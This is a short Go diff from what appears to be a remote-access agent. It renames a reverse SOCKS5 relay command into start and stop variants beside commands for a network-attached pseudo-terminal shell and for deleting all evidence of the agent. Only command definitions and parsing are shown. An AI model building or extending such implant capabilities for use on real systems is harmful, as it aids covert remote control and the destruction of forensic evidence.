@@ -10,7 +10,8 @@ type Command uint8
 const (
 	_ = iota // We don't want 0 values
 	// Uses the relay to create a reverse socks connection
-	Socks5
+	StartSocks5
+	StopSocks5
 	// Creates a pseudo-terminal and connects stdin, stdout, and stderr to the net.Conn
 	ShellTCP
 	// Deletes all evidence of the agent
@@ -41,7 +42,7 @@ func ParseCommand(line string) (*CommandStruct, error) {
 	}
 	switch arg[0] {
 	case "socks":
-		cs.Command = Socks5
+		cs.Command = StartSocks5
 	case "sh":
 		cs.Command = ShellTCP
 	case "kill":
